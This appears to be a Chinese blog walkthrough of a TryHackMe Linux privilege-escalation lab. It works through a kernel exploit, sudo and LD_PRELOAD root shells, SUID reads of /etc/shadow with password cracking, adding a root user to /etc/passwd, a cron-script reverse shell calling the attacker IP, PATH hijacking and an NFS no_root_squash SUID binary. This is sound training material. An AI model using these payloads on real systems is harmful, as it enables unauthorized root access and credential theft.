<h1 id="利用内核漏洞提权"><a href="#利用内核漏洞提权" class="headerlink" title="利用内核漏洞提权"></a>利用内核漏洞提权</h1><h2 id="内核漏洞利用方法思路"><a href="#内核漏洞利用方法思路" class="headerlink" title="内核漏洞利用方法思路"></a>内核漏洞利用方法思路</h2><ol>
<li>确定内核版本</li>
<li>搜索并查找目标系统内核版本的漏洞利用代码，一看<a target="_blank" rel="noopener" href="https://www.exploit-db.com/">这</a></li>
<li>运行漏洞利用</li>
</ol>
<h3 id="失败的内核漏洞可能会导致系统崩溃。在尝试利用内核之前，请确保此潜在结果在您的渗透测试参与范围内是可接受的"><a href="#失败的内核漏洞可能会导致系统崩溃。在尝试利用内核之前，请确保此潜在结果在您的渗透测试参与范围内是可接受的" class="headerlink" title="失败的内核漏洞可能会导致系统崩溃。在尝试利用内核之前，请确保此潜在结果在您的渗透测试参与范围内是可接受的"></a>失败的内核漏洞可能会导致系统崩溃。在尝试利用内核之前，请确保此潜在结果在您的渗透测试参与范围内是可接受的</h3><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>先看靶机内核版本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250421105927.png"><br>丢给ai分析，可能是存在CVE-2015-1328可利用<br>在<a target="_blank" rel="noopener" href="https://www.exploit-db.com/">这</a>搜索相关利用脚本<br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250421110738.png"><br>中间的那个是个c文件<br>下载下来编译一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o cve_2015_1328 37292.c</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250421111357.png"><br>让靶机远程下载</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp lan1oc@10.21.170.43:/home/lan1oc/Downloads/cve_2015_1328 /tmp</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250421111728.png"><br>肥肠尴尬<br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250421111818.png"><br>看来得在靶机上编译才行<br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250421112248.png"><br>成功提权<br>找flag1.txt<br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250421112441.png"></p>
<h1 id="利用sudo提权"><a href="#利用sudo提权" class="headerlink" title="利用sudo提权"></a>利用sudo提权</h1><p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">这</a>提供了有关如何使用可能拥有 sudo 权限的任何程序的信息</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="sudo直接提权"><a href="#sudo直接提权" class="headerlink" title="sudo直接提权"></a>sudo直接提权</h3><ol>
<li><p>先找能用sudo命令的命令</p>
<pre><code>1
</code></pre>
</li>
</ol>
<p>| </p>
<pre><code>     sudo -l  
       
</code></pre>
<p>—|—<br>  2. 然后从<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">这</a>找利用方法</p>
<h3 id="LD-PRELOAD利用的思路"><a href="#LD-PRELOAD利用的思路" class="headerlink" title="LD_PRELOAD利用的思路"></a>LD_PRELOAD利用的思路</h3><ol>
<li><p>检查 LD_PRELOAD（使用 env_keep 选项）<br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250421114134.png"></p>
</li>
<li><p>编写编译为共享对象（.so 扩展名）文件的简单 C 代码</p>
<pre><code>1  
2  
3  
4  
5  
6  
7  
8  
9  
10
</code></pre>
</li>
</ol>
<p>| </p>
<pre><code>     #include &lt;stdio.h&gt;  
     #include &lt;sys/types.h&gt;  
     #include &lt;stdlib.h&gt;  
       
     void _init() &#123;  
     unsetenv(&quot;LD_PRELOAD&quot;);  
     setgid(0);  
     setuid(0);  
     system(&quot;/bin/bash&quot;);  
     &#125;  
       
</code></pre>
<p>—|—<br>编译一下</p>
<pre><code>     1  
     
</code></pre>
<p>| </p>
<pre><code>     gcc -fPIC -shared -o shell.so shell.c -nostartfiles  
       
</code></pre>
<p>—|—<br>  3. 使用 sudo 权限和指向我们的 .so 文件的 LD_PRELOAD 选项运行程序</p>
<pre><code>     1  
     
</code></pre>
<p>| </p>
<pre><code>     sudo LD_PRELOAD=/home/user/ldpreload/shell.so find  
       
</code></pre>
<p>—|—<br>这将导致生成具有 root 权限的 shell</p>
<h2 id="回答问题-1"><a href="#回答问题-1" class="headerlink" title="回答问题"></a>回答问题</h2><h3 id="用户-“karen”-可以在具有-sudo-权限的目标系统上运行多少个程序？"><a href="#用户-“karen”-可以在具有-sudo-权限的目标系统上运行多少个程序？" class="headerlink" title="用户 “karen” 可以在具有 sudo 权限的目标系统上运行多少个程序？"></a>用户 “karen” 可以在具有 sudo 权限的目标系统上运行多少个程序？</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250421114458.png"></p>
<h3 id="flag2-txt-文件的内容是什么？"><a href="#flag2-txt-文件的内容是什么？" class="headerlink" title="flag2.txt 文件的内容是什么？"></a>flag2.txt 文件的内容是什么？</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag2.txt 2&gt;/dev/null|grep flag</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250421120119.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/ubuntu/flag2.txt</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250421120156.png"></p>
<h3 id="如果您的用户在-nmap-上拥有-sudo-权限，您将如何使用-Nmap-生成根-shell？"><a href="#如果您的用户在-nmap-上拥有-sudo-权限，您将如何使用-Nmap-生成根-shell？" class="headerlink" title="如果您的用户在 nmap 上拥有 sudo 权限，您将如何使用 Nmap 生成根 shell？"></a>如果您的用户在 nmap 上拥有 sudo 权限，您将如何使用 Nmap 生成根 shell？</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --interactive</span><br></pre></td></tr></table></figure>

<h3 id="frank-的密码哈希值是多少？"><a href="#frank-的密码哈希值是多少？" class="headerlink" title="frank 的密码哈希值是多少？"></a>frank 的密码哈希值是多少？</h3><p>先提权，找下运行用sudo命令的命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250421133306.png"><br>有个find，那就直接脱离受限环境</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find . -exec /bin/sh \; -quit</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250421133345.png"><br>然后读文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/shadow|grep frank</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250421133404.png"></p>
<h1 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><ol>
<li><p>先找有suid的命令</p>
<pre><code>1
</code></pre>
</li>
</ol>
<p>| </p>
<pre><code>     find / -type f -perm -4000 -ls 2&gt;/dev/null  
       
</code></pre>
<p>—|—<br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250421134111.png"><br>  2. 然后从<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">这</a>找利用方法</p>
<h2 id="例子：nano提权（nano具有suid）"><a href="#例子：nano提权（nano具有suid）" class="headerlink" title="例子：nano提权（nano具有suid）"></a>例子：nano提权（nano具有suid）</h2><p>两种利用思路</p>
<h3 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/shadow</span><br></pre></td></tr></table></figure>

<p>将打印 &#x2F;etc&#x2F;shadow 文件的 内容<br>创建一个可以被 John the Ripper 破解的文件(读取&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;shadow)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unshadow passwd.txt shadow.txt &gt; passwords.txt</span><br></pre></td></tr></table></figure>

<p>然后用john破解</p>
<h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><p>需要新用户要使用的密码的哈希值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt aaa 1412</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用openssl对password1这个密码生成一个密码哈希</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250421170730.png"><br>将这个密码和用户名添加到 &#x2F;etc&#x2F;passwd 文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack:$1$aaa$sSXZ4A4TP1A3T9YQEumVU/:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p>然后切换到hack用户，就将拥有root权限<br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250421171404.png"></p>
<h2 id="实操以及回答问题"><a href="#实操以及回答问题" class="headerlink" title="实操以及回答问题"></a>实操以及回答问题</h2><h3 id="哪个用户分享了一位伟大的漫画作家的名字？"><a href="#哪个用户分享了一位伟大的漫画作家的名字？" class="headerlink" title="哪个用户分享了一位伟大的漫画作家的名字？"></a>哪个用户分享了一位伟大的漫画作家的名字？</h3><p>先找suid置位的命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -perm -4000 -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>看到有at，直接读文件看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;cat /etc/passwd &gt; /tmp/passwd1.txt&quot; | at now</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /tmp/passwd1.txt</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250421172620.png"><br>切一下输出一下，看看用户名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /tmp/passwd1.txt|cut -d &quot;:&quot; -f 1</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250421172801.png"></p>
<h3 id="user2-的密码是什么？"><a href="#user2-的密码是什么？" class="headerlink" title="user2 的密码是什么？"></a>user2 的密码是什么？</h3><p>看看密码(at命令失败了，换base64)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 /etc/shadow|base64 --decode</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250422091623.png"><br>读到内容了，切一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 /etc/shadow|base64 --decode|grep user2 &gt; /tmp/passwd2.txt</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250422091749.png"><br>处理一下用户名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 /etc/passwd|base64 --decode|grep user2 &gt; /tmp/passwd1.txt</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250422092110.png"><br>用unshadow处理一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./unshadow passwd1.txt passwd2.txt &gt; unshadowed.txt</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250422092443.png"><br>用john破解一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./john --wordlist=/home/lan1oc/fuzzDicts-master/rockyou/rockyou.txt --format=sha512crypt unshadowed.txt</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250422093434.png"></p>
<h3 id="flag3-txt-文件的内容是什么？"><a href="#flag3-txt-文件的内容是什么？" class="headerlink" title="flag3.txt 文件的内容是什么？"></a>flag3.txt 文件的内容是什么？</h3><p>先找下在哪</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag3.txt 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250422093659.png"><br>不能直接读，那就base64秒了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 /home/ubuntu/flag3.txt|base64 --decode</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250422093816.png"></p>
<h1 id="利用功能提权"><a href="#利用功能提权" class="headerlink" title="利用功能提权"></a>利用功能提权</h1><p>对应的是这方面提权的东西<br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/e38ac404090c99dbb0b89bb4d5819798.png"></p>
<h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>先找开启set功能的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250422095646.png"><br>然后去<code>GTOBins</code>找就行了</p>
<h2 id="回答问题-2"><a href="#回答问题-2" class="headerlink" title="回答问题"></a>回答问题</h2><h3 id="有多少个二进制文件具有-set-功能？"><a href="#有多少个二进制文件具有-set-功能？" class="headerlink" title="有多少个二进制文件具有 set 功能？"></a>有多少个二进制文件具有 set 功能？</h3><p>6</p>
<h3 id="还可以通过其功能使用哪些其他二进制文件？"><a href="#还可以通过其功能使用哪些其他二进制文件？" class="headerlink" title="还可以通过其功能使用哪些其他二进制文件？"></a>还可以通过其功能使用哪些其他二进制文件？</h3><p>view</p>
<h3 id="flag4-txt-文件的内容是什么？"><a href="#flag4-txt-文件的内容是什么？" class="headerlink" title="flag4.txt 文件的内容是什么？"></a>flag4.txt 文件的内容是什么？</h3><p>先找在哪</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag4.txt 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>然后查看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view /home/ubuntu/flag4.txt</span><br></pre></td></tr></table></figure>

<h1 id="利用定时任务提权"><a href="#利用定时任务提权" class="headerlink" title="利用定时任务提权"></a>利用定时任务提权</h1><h2 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h2><p>定时任务总是值得检查的，因为它有时会导致简单的权限提升向量。以下情况在没有特定网络安全成熟度级别的公司中并不少见：</p>
<ol>
<li>系统管理员需要定期运行脚本。</li>
<li>他们创建一个 cron 作业来执行此作</li>
<li>过了一会儿，脚本变得无用了，他们删除了它 </li>
<li>它们不会清理相关的 cron 作业</li>
</ol>
<h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>定时任务一般是在<code>/etc/crontab</code><br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250422101732.png"><br>如果未定义脚本的完整路径，cron 将引用 &#x2F;etc&#x2F;crontab 文件中 PATH 变量下列出的路径<br>如果PATH变量有&#x2F;home&#x2F;用户名，那么在对应用户名的主文件夹创建那个脚本，定时任务也将会去执行它<br>如果有当前用户主文件夹中的脚本被定时任务执行，可以通过修改这个脚本来提权</p>
<h2 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h2><p>先看看定时任务文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250422111608.png"><br>PATH变量没有当前用户主目录，但是在当前用户有个计划任务所用的脚本<br>尝试对其添加反弹shell的语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -c &#x27;exec bash -i &gt; /dev/tcp/10.21.170.43/404 0&gt;&amp;1 2&gt;&amp;1&#x27;&quot; &gt;&gt; /home/karen/backup.sh</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250422112102.png"><br>然后给这个脚本赋予可执行权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x backup.sh</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250422113743.png"></p>
<h2 id="回答问题-3"><a href="#回答问题-3" class="headerlink" title="回答问题"></a>回答问题</h2><h3 id="flag5-txt-文件的内容是什么？"><a href="#flag5-txt-文件的内容是什么？" class="headerlink" title="flag5.txt 文件的内容是什么？"></a>flag5.txt 文件的内容是什么？</h3><p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250422114344.png"></p>
<h3 id="Matt-的密码是什么？"><a href="#Matt-的密码是什么？" class="headerlink" title="Matt 的密码是什么？"></a>Matt 的密码是什么？</h3><p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250422114844.png"></p>
<h1 id="利用PATH变量提权"><a href="#利用PATH变量提权" class="headerlink" title="利用PATH变量提权"></a>利用PATH变量提权</h1><p>PATH 是一个环境变量，它告诉作系统在何处搜索可执行文件，对于未内置于 shell 中或未使用绝对路径定义的任何命令，Linux 将开始在 PATH 下定义的文件夹中搜索</p>
<h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><p>如果<code>$PATH</code>中包含的路径存在当前用户可写的，可在其中写入恶意可执行文件并运行</p>
<ol>
<li>先看<code>$PATH</code><br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423092354.png"></li>
<li>再找可写文件夹<br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423092903.png"></li>
<li>然后把要用的可写文件夹写入<code>$PATH</code>中</li>
<li>再可写文件夹中创建恶意可执行文件，设置 SUID 位后，此二进制文件将以 root 权限运行</li>
</ol>
<h2 id="实操-2"><a href="#实操-2" class="headerlink" title="实操"></a>实操</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>找到一个用户文件夹<br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/54bb383f2ef5f7dd8f9e25f793f13e4f.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag6.txt 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423093436.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    FILE *file;</span><br><span class="line">    char buffer[1024]; // 假设文件内容不超过1024字节</span><br><span class="line">    size_t bytesRead;</span><br><span class="line"></span><br><span class="line">    // 打开文件</span><br><span class="line">    file = fopen(&quot;/home/matt/flag6.txt&quot;, &quot;r&quot;);</span><br><span class="line">    if (file == NULL) &#123;</span><br><span class="line">        perror(&quot;无法打开文件&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 读取文件内容</span><br><span class="line">    bytesRead = fread(buffer, 1, sizeof(buffer) - 1, file);</span><br><span class="line">    if (bytesRead == 0 &amp;&amp; ferror(file)) &#123;</span><br><span class="line">        perror(&quot;读取文件时出错&quot;);</span><br><span class="line">        fclose(file);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 确保字符串以空字符结尾</span><br><span class="line">    buffer[bytesRead] = &#x27;\0&#x27;;</span><br><span class="line"></span><br><span class="line">    // 打印文件内容</span><br><span class="line">    printf(&quot;%s&quot;, buffer);</span><br><span class="line"></span><br><span class="line">    // 关闭文件</span><br><span class="line">    fclose(file);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc 1.c -o 1</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423094126.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=/home/murdoch:$PATH</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423094432.png"><br>远程下载一下<br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423094704.png"><br>肥肠尴尬<br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423094738.png"><br>看了提示才知道，这题纯是脑洞题啊，有个可执行文件<code>test</code>，它会执行thm文件，那就创建一个并写入命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/matt/flag6.txt</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423100114.png"></p>
<h1 id="NFS提权"><a href="#NFS提权" class="headerlink" title="NFS提权"></a>NFS提权</h1><p>Network File System，网络文件系统<br>共享文件夹和远程管理界面（如 SSH 和 Telnet）还可以帮助您获得对目标系统的 root 访问权限。在某些情况下，还需要同时使用这两种向量，例如，在目标系统上找到根 SSH 私钥，并使用 root 权限通过 SSH 进行连接，而不是尝试提高当前用户的权限级别<br>NFS（网络文件共享）配置保存在 &#x2F;etc&#x2F;exports 文件中。此文件是在 NFS 服务器安装期间创建的，通常可由用户读取</p>
<h3 id="前提：有个文件夹配置了no-root-squash参数，然后创建恶意可执行文件需要在root进行"><a href="#前提：有个文件夹配置了no-root-squash参数，然后创建恶意可执行文件需要在root进行" class="headerlink" title="前提：有个文件夹配置了no_root_squash参数，然后创建恶意可执行文件需要在root进行"></a>前提：有个文件夹配置了no_root_squash参数，然后创建恶意可执行文件需要在root进行</h3><p>如果可写共享资源上存在 “no_root_squash” 选项，可以创建一个设置了 SUID 位的可执行文件，并在目标系统上运行它</p>
<h2 id="实操-3"><a href="#实操-3" class="headerlink" title="实操"></a>实操</h2><p>先在目标上找配置了<code>no_root_squash</code>的共享</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/exports</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423101400.png"><br>从攻击机器中列举可挂载的份额</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showmount -e 10.10.73.55</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423101109.png"><br>比对发现，随便一个都行，那就挂载一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/tmp;sudo mount -o rw 10.10.73.55:/tmp /tmp/tmp</span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423102311.png"><br><img src="/../../../../images/THM/linux%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80/Pasted%20image%2020250423102328.png"><br>接下来攻击机挂载的那个目录开始构建可执行文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    system(&quot;/bin/bash&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc 1.c -o 1 -w</span><br></pre></td></tr></table></figure>

